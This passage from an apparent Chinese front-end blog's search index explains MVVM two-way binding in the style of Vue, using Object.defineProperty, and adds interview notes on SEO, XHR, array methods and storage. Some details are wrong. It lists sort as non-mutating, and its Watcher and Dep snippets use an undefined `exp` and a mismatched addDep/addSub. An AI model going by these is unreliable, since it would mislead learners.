设置writeable之后，设置的属性不可以改写<br>value: ‘hello world’// 获取该值时，返回value内容，value不可以与set或get函数同时存在</p>\n<h2 id=\"实现思路\"><a href=\"#实现思路\" class=\"headerlink\" title=\"实现思路\"></a>实现思路</h2><p>了解实现核心概念后，我们一起来了解一下总体实现思路</p>\n<h3 id=\"要实现mvvm的双向绑定，就必须要实现以下几点\"><a href=\"#要实现mvvm的双向绑定，就必须要实现以下几点\" class=\"headerlink\" title=\"要实现mvvm的双向绑定，就必须要实现以下几点\"></a>要实现mvvm的双向绑定，就必须要实现以下几点</h3><p>实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者<br>实现一个指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数<br>实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图<br>mvvm入口函数，整合以上三者</p>\n<p>上述流程如图所示:</p>\n<p><img src=\"media/2.png\" alt=\"2\"></p>\n<h3 id=\"实现Observer\"><a href=\"#实现Observer\" class=\"headerlink\" title=\"实现Observer\"></a>实现Observer</h3><ul>\n<li>我们知道可以利用Obeject.defineProperty()来监听属性变动</li>\n<li>那么将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上setter和getter</li>\n<li>这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。相关代码可以是这样</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var data = &#123;name: &apos;kindeng&apos;&#125;;</span><br><span class=\"line\">observe(data);</span><br><span class=\"line\">data.name = &apos;dmq&apos;; // 哈哈哈，监听到值变化了 kindeng --&gt; dmq</span><br><span class=\"line\"></span><br><span class=\"line\">function observe(data) &#123;</span><br><span class=\"line\">    if (!data || typeof data !== &apos;object&apos;) &#123;</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    // 取出所有属性遍历</span><br><span class=\"line\">    Object.keys(data).forEach(function(key) &#123;</span><br><span class=\"line\">\t    defineReactive(data, key, data[key]);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">function defineReactive(data, key, val) &#123;</span><br><span class=\"line\">    observe(val); // 监听子属性</span><br><span class=\"line\">    Object.defineProperty(data, key, &#123;</span><br><span class=\"line\">        enumerable: true, // 可枚举</span><br><span class=\"line\">        configurable: false, // 不能再define</span><br><span class=\"line\">        get: function() &#123;</span><br><span class=\"line\">            return val;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        set: function(newVal) &#123;</span><br><span class=\"line\">            console.log(&apos;哈哈哈，监听到值变化了 &apos;, val, &apos; --&gt; &apos;, newVal);</span><br><span class=\"line\">            val = newVal;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这样我们已经可以监听每个数据的变化了，那么监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法，代码改善之后是这样</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ... 省略</span><br><span class=\"line\">function defineReactive(data, key, val) &#123;</span><br><span class=\"line\">\tvar dep = new Dep();</span><br><span class=\"line\">    observe(val); // 监听子属性</span><br><span class=\"line\"></span><br><span class=\"line\">    Object.defineProperty(data, key, &#123;</span><br><span class=\"line\">        // ... 省略</span><br><span class=\"line\">        set: function(newVal) &#123;</span><br><span class=\"line\">        \tif (val === newVal) return;</span><br><span class=\"line\">            console.log(&apos;哈哈哈，监听到值变化了 &apos;, val, &apos; --&gt; &apos;, newVal);</span><br><span class=\"line\">            val = newVal;</span><br><span class=\"line\">            dep.notify(); // 通知所有订阅者</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function Dep() &#123;</span><br><span class=\"line\">    this.subs = [];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Dep.prototype = &#123;</span><br><span class=\"line\">    addSub: function(sub) &#123;</span><br><span class=\"line\">        this.subs.push(sub);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    notify: function() &#123;</span><br><span class=\"line\">        this.subs.forEach(function(sub) &#123;</span><br><span class=\"line\">            sub.update();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>那么问题来了，谁是订阅者，怎么往订阅器添加订阅者？</li>\n<li>没错，上面的思路整理中我们已经明确订阅者应该是Watcher, 而且var dep = new Dep();是在 defineReactive方法内部定义的，所以想通过dep添加订阅者，就必须要在闭包内操作，所以我们可以在getter里面动手脚:</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Observer.js</span><br><span class=\"line\">// ...省略</span><br><span class=\"line\">Object.defineProperty(data, key, &#123;</span><br><span class=\"line\">\tget: function() &#123;</span><br><span class=\"line\">\t\t// 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除</span><br><span class=\"line\">\t\tDep.target &amp;&amp; dep.addDep(Dep.target);</span><br><span class=\"line\">\t\treturn val;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    // ... 省略</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">// Watcher.js</span><br><span class=\"line\">Watcher.prototype = &#123;</span><br><span class=\"line\">\tget: function(key) &#123;</span><br><span class=\"line\">\t\tDep.target = this;</span><br><span class=\"line\">\t\tthis.value = data[key];\t// 这里会触发属性的getter，从而添加订阅者</span><br><span class=\"line\">\t\tDep.target = null;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>这里已经实现了一个Observer了，已经具备了监听数据和数据变化通知订阅者的功能。那么接下来就是实现Compile了</li>\n</ul>\n<blockquote>\n<p>实现Compile</p>\n</blockquote>\n<ul>\n<li>compile主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图</li>\n<li>并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，如图所示</li>\n</ul>\n<p>因为遍历解析的过程有多次操作dom节点，为提高性能和效率，会先将跟节点el转换成文档碎片fragment进行解析编译操作<br>解析完成，再将fragment添加回原来的真实dom节点中</p>\n<p><img src=\"media/3.png\" alt=\"3\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Compile(el) &#123;</span><br><span class=\"line\">    this.$el = this.isElementNode(el) ? el : document.querySelector(el);</span><br><span class=\"line\">    if (this.$el) &#123;</span><br><span class=\"line\">        this.$fragment = this.node2Fragment(this.$el);</span><br><span class=\"line\">        this.init();</span><br><span class=\"line\">        this.$el.appendChild(this.$fragment);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Compile.prototype = &#123;</span><br><span class=\"line\">\tinit: function() &#123; this.compileElement(this.$fragment); &#125;,</span><br><span class=\"line\">    node2Fragment: function(el) &#123;</span><br><span class=\"line\">        var fragment = document.createDocumentFragment(), child;</span><br><span class=\"line\">        // 将原生节点拷贝到fragment</span><br><span class=\"line\">        while (child = el.firstChild) &#123;</span><br><span class=\"line\">            fragment.appendChild(child);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return fragment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>compileElement方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定，详看代码及注释说明</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Compile.prototype = &#123;</span><br><span class=\"line\">\t// ... 省略</span><br><span class=\"line\">\tcompileElement: function(el) &#123;</span><br><span class=\"line\">        var childNodes = el.childNodes, me = this;</span><br><span class=\"line\">        [].slice.call(childNodes).forEach(function(node) &#123;</span><br><span class=\"line\">            var text = node.textContent;</span><br><span class=\"line\">            var reg = /\\&#123;\\&#123;(.*)\\&#125;\\&#125;/;\t// 表达式文本</span><br><span class=\"line\">            // 按元素节点方式编译</span><br><span class=\"line\">            if (me.isElementNode(node)) &#123;</span><br><span class=\"line\">                me.compile(node);</span><br><span class=\"line\">            &#125; else if (me.isTextNode(node) &amp;&amp; reg.test(text)) &#123;</span><br><span class=\"line\">                me.compileText(node, RegExp.$1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            // 遍历编译子节点</span><br><span class=\"line\">            if (node.childNodes &amp;&amp; node.childNodes.length) &#123;</span><br><span class=\"line\">                me.compileElement(node);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    compile: function(node) &#123;</span><br><span class=\"line\">        var nodeAttrs = node.attributes, me = this;</span><br><span class=\"line\">        [].slice.call(nodeAttrs).forEach(function(attr) &#123;</span><br><span class=\"line\">            // 规定:指令以 v-xxx 命名</span><br><span class=\"line\">            // 如 &lt;span v-text=&quot;content&quot;&gt;&lt;/span&gt; 中指令为 v-text</span><br><span class=\"line\">            var attrName = attr.name;\t// v-text</span><br><span class=\"line\">            if (me.isDirective(attrName)) &#123;</span><br><span class=\"line\">                var exp = attr.value; // content</span><br><span class=\"line\">                var dir = attrName.substring(2);\t// text</span><br><span class=\"line\">                if (me.isEventDirective(dir)) &#123;</span><br><span class=\"line\">                \t// 事件指令, 如 v-on:click</span><br><span class=\"line\">                    compileUtil.eventHandler(node, me.$vm, exp, dir);</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                \t// 普通指令</span><br><span class=\"line\">                    compileUtil[dir] &amp;&amp; compileUtil[dir](node, me.$vm, exp);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 指令处理集合</span><br><span class=\"line\">var compileUtil = &#123;</span><br><span class=\"line\">    text: function(node, vm, exp) &#123;</span><br><span class=\"line\">        this.bind(node, vm, exp, &apos;text&apos;);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    // ...省略</span><br><span class=\"line\">    bind: function(node, vm, exp, dir) &#123;</span><br><span class=\"line\">        var updaterFn = updater[dir + &apos;Updater&apos;];</span><br><span class=\"line\">        // 第一次初始化视图</span><br><span class=\"line\">        updaterFn &amp;&amp; updaterFn(node, vm[exp]);</span><br><span class=\"line\">        // 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher</span><br><span class=\"line\">        new Watcher(vm, exp, function(value, oldValue) &#123;</span><br><span class=\"line\">        \t// 一旦属性值有变化，会收到通知执行此更新函数，更新视图</span><br><span class=\"line\">            updaterFn &amp;&amp; updaterFn(node, value, oldValue);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 更新函数</span><br><span class=\"line\">var updater = &#123;</span><br><span class=\"line\">    textUpdater: function(node, value) &#123;</span><br><span class=\"line\">        node.textContent = typeof value == &apos;undefined&apos; ? &apos;&apos; : value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    // ...省略</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>这里通过递归遍历保证了每个节点及子节点都会解析编译到</li>\n<li>指令的声明规定是通过特定前缀的节点属性来标记，如&lt;span v-text=”content”中v-text便是指令</li>\n<li>监听数据、绑定更新函数的处理是在compileUtil.bind()这个方法中，通过new Watcher()添加回调来接收数据变化的通知</li>\n<li>至此，一个简单的Compile就完成了。接下来要看看Watcher这个订阅者的具体实现了</li>\n</ul>\n<h3 id=\"实现Watcher\"><a href=\"#实现Watcher\" class=\"headerlink\" title=\"实现Watcher\"></a>实现Watcher</h3><blockquote>\n<p>Watcher订阅者作为Observer和Compile之间通信的桥梁，主要做的事情是</p>\n</blockquote>\n<ul>\n<li>在自身实例化时往属性订阅器dep里面添加自己</li>\n<li>自身必须有一个update()方法</li>\n<li>待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Watcher(vm, exp, cb) &#123;</span><br><span class=\"line\">    this.cb = cb;</span><br><span class=\"line\">    this.vm = vm;</span><br><span class=\"line\">    this.exp = exp;</span><br><span class=\"line\">    // 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解</span><br><span class=\"line\">    this.value = this.get(); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Watcher.prototype = &#123;</span><br><span class=\"line\">    update: function() &#123;</span><br><span class=\"line\">        this.run();\t// 属性值变化收到通知</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    run: function() &#123;</span><br><span class=\"line\">        var value = this.get(); // 取到最新值</span><br><span class=\"line\">        var oldVal = this.value;</span><br><span class=\"line\">        if (value !== oldVal) &#123;</span><br><span class=\"line\">            this.value = value;</span><br><span class=\"line\">            this.cb.call(this.vm, value, oldVal); // 执行Compile中绑定的回调，更新视图</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">        Dep.target = this;\t// 将当前订阅者指向自己</span><br><span class=\"line\">        var value = this.vm[exp];\t// 触发getter，添加自己到属性订阅器中</span><br><span class=\"line\">        Dep.target = null;\t// 添加完毕，重置</span><br><span class=\"line\">        return value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">// 这里再次列出Observer和Dep，方便理解</span><br><span class=\"line\">Object.defineProperty(data, key, &#123;</span><br><span class=\"line\">\tget: function() &#123;</span><br><span class=\"line\">\t\t// 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除</span><br><span class=\"line\">\t\tDep.target &amp;&amp; dep.addDep(Dep.target);</span><br><span class=\"line\">\t\treturn val;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    // ... 省略</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Dep.prototype = &#123;</span><br><span class=\"line\">    notify: function() &#123;</span><br><span class=\"line\">        this.subs.forEach(function(sub) &#123;</span><br><span class=\"line\">            sub.update(); // 调用订阅者的update方法，通知变化</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>实例化Watcher的时候，调用get()方法，通过Dep.target = watcherInstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcherInstance就能收到更新通知。</li>\n<li>基本上vue中数据绑定相关比较核心的几个模块也是这几个，猛戳这里 , 在src 目录可找到vue源码。</li>\n</ul>\n<blockquote>\n<p>实现MVVM</p>\n</blockquote>\n<p><code>MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。</code></p>\n<blockquote>\n<p>一个简单的MVVM构造器是这样子:</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function MVVM(options) &#123;</span><br><span class=\"line\">    this.$options = options;</span><br><span class=\"line\">    var data = this._data = this.$options.data;</span><br><span class=\"line\">    observe(data, this);</span><br><span class=\"line\">    this.$compile = new Compile(options.el || document.body, this)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>但是这里有个问题，从代码中可看出监听的数据对象是options.data，每次需要更新视图，则必须通过var vm = new MVVM({data:{name: ‘kindeng’}}); vm._data.name = ‘dmq’;这样的方式来改变数据。</li>\n<li>显然不符合我们一开始的期望，我们所期望的调用方式应该是这样的:</li>\n<li>var vm = new MVVM({data: {name: ‘kindeng’}}); vm.name = ‘dmq’;</li>\n<li>所以这里需要给MVVM实例添加一个属性代理的方法，使访问vm的属性代理为访问vm._data的属性，改造后的代码如下</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function MVVM(options) &#123;</span><br><span class=\"line\">    this.$options = options;</span><br><span class=\"line\">    var data = this._data = this.$options.data, me = this;</span><br><span class=\"line\">    // 属性代理，实现 vm.xxx -&gt; vm._data.xxx</span><br><span class=\"line\">    Object.keys(data).forEach(function(key) &#123;</span><br><span class=\"line\">        me._proxy(key);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    observe(data, this);</span><br><span class=\"line\">    this.$compile = new Compile(options.el || document.body, this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MVVM.prototype = &#123;</span><br><span class=\"line\">\t_proxy: function(key) &#123;</span><br><span class=\"line\">\t\tvar me = this;</span><br><span class=\"line\">        Object.defineProperty(me, key, &#123;</span><br><span class=\"line\">            configurable: false,</span><br><span class=\"line\">            enumerable: true,</span><br><span class=\"line\">            get: function proxyGetter() &#123;</span><br><span class=\"line\">                return me._data[key];</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            set: function proxySetter(newVal) &#123;</span><br><span class=\"line\">                me._data[key] = newVal;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>这里主要还是利用了Object.defineProperty()这个方法来劫持了vm实例对象的属性的读写权，使读写vm实例的属性转成读写了vm._data的属性值，达到鱼目混珠的效果</li>\n</ul>\n","categories":["vue"],"tags":["vue"]},{"title":"vue源码解析","url":"http://zhoushaw.github.io/2018/03/16/learning/font-end/vue/analyze-vue/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在正式进入分析vue.js源码阶段之前，首先让我们携带几个问题，这些问题能帮助我们更加清晰的分析Vue对于前端开发来说意味着什么为什么使用Vue.js能大幅提升前端同学的开发效率、代码质量、可维护性</p>\n<div><a id=\"more\"></a></div>\n\n<p>对于传统的前端开发流程来说(不使用任何前端框架)，使用Vue.js框架进入开发后效率大幅度提升，再不使用MVVM框架前我们大多部分的时间都放在寻找dom，更新dom数据。在使用Vue.js后，页面基本UI完成后，我们主要的时间就放在了处理数据，更新数据方面，视图更新数据，数据更新视图。效率提升百分之好几百</p>\n<p>需要带着的几个问题:</p>\n<ul>\n<li>Vue是如何实现数据与视图双向绑定的</li>\n<li>计算属性和观察者如何触发</li>\n<li>初始化Vue时，vue内部到底干了什么</li>\n<li>nextTick内部实现</li>\n</ul>\n","categories":["vue"],"tags":["vue"]},{"title":"知识大杂烩","url":"http://zhoushaw.github.io/2018/02/01/learning/font-end/js/js-interview/","content":"<p><div><a id=\"more\"></a></div></p>\n<h2 id=\"SEO\"><a href=\"#SEO\" class=\"headerlink\" title=\"SEO\"></a>SEO</h2><p>1.合理的title、description、keywords:搜索引擎对于三项的权重逐个减小。<br>2.使用语义化标签，爬虫更容易理解和抓取<br>3.重要内容不要使用js外部引入，爬虫不容易抓取<br>4.网页加载速度也是爬虫评判的重要标准<br>5.每个页要只能出现一次H1标签，H2~H6标签可以多次，这样做是为了加重H1标签的权重。 </p>\n<h2 id=\"XMLHttp-原生写法\"><a href=\"#XMLHttp-原生写法\" class=\"headerlink\" title=\"XMLHttp 原生写法\"></a>XMLHttp 原生写法</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> xhr = <span class=\"literal\">null</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\txhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">&#125;<span class=\"keyword\">catch</span>&#123;</span><br><span class=\"line\">\txhr = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHttp'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">xhr.open(<span class=\"string\">'get'</span>,<span class=\"string\">'www.baidu.com'</span>,<span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.send();</span><br><span class=\"line\"></span><br><span class=\"line\">xhr.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(xhr.readyState==<span class=\"number\">4</span>&amp;&amp;xhr.status==<span class=\"number\">200</span>)&#123;</span><br><span class=\"line\">\t\talert(xhr.responseText)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h2><blockquote>\n<p>修改原数组</p>\n</blockquote>\n<p>push<br>pop<br>shift<br>unshift<br>reverse<br>splice</p>\n<blockquote>\n<p>不修改原数组，返回处理的新数组</p>\n</blockquote>\n<p>slice<br>sort</p>\n<h2 id=\"cookie、sessionStorage、localStorage\"><a href=\"#cookie、sessionStorage、localStorage\" class=\"headerlink\" title=\"cookie、sessionStorage、localStorage\"></a>cookie、sessionStorage、localStorage</h2><blockquote>\n<p>区别</p>\n</blockquote>\n<ul>\n<li><p>大小:</p>\n<p>  cookie  – 5kb<br>  sessionStorage  – 5MB<br>  localStorage    – 5MB</p>\n</li>\n<li><p>使用场景:</p>\n<p>  cookie  –  服务端在请求头报文中增加set-cookie，请求回来时自动将cookie存入本地。在同源http请求中将自动在request Head中携带cookie</p>\n<p>  sessionStorage – 